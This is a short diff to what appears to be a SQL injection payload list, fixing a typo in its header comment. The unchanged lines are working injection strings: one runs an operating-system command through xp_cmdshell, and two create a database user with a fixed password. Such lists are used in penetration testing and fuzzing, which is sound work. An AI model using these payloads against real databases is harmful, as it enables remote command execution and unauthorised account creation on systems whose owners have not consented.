@@ -1,4 +1,4 @@
-# you will need to customize/modify some of the vaules in the queries for best effect
+# you will need to customize/modify some of the values in the queries for best effect
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 'create user name identified by 'pass123' --
 'create user name identified by pass123 temporary tablespace temp default tablespace users; 
